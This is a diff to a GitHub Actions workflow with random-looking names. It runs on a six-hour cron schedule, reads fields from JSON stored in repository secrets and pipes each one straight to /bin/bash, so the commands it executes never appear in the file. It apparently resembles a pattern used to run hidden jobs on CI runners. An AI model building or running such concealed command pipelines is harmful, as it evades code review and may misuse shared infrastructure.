@@ -2,8 +2,9 @@ name: jiadoufu6745
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
-jobs:  # 3144
+    - cron: '33 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,16 +12,11 @@ jobs:  # 3144
       - uses: actions/checkout@v4
       - name: jiadoufu6745
         env:
-          lv9725: ${{ secrets.lv9725 }}
+          w99787: ${{ secrets.w99787 }}
         run: |
-          echo $lv9725 | jq -r .g17970 | /bin/bash
-          echo $gvvv241 | jq -r .zvn96 | /bin/bash
-          echo $fid35 | jq -r .p0 | /bin/bash
-          echo $os2 | jq -r .jyocc01308 | /bin/bash
-          echo $bfr65142 | jq -r .qfu1977 | /bin/bash
-          echo $akgd68080 | jq -r .y40796 | /bin/bash
-          echo $p9229 | jq -r .qpcc08255 | /bin/bash
-          echo $szcnz5 | jq -r .ihjy6294 | /bin/bash
-          echo $u9391 | jq -r .zmp3668 | /bin/bash
-          echo $pms28178 | jq -r .d27004 | /bin/bash
+          echo $w99787 | jq -r .m9815 | /bin/bash
+          echo $dng3 | jq -r .h9 | /bin/bash
+          echo $bzk18083 | jq -r .on59537 | /bin/bash
+          echo $fxik4809 | jq -r .k5409 | /bin/bash
+          echo $zuu78903 | jq -r .yfk7098 | /bin/bash
 
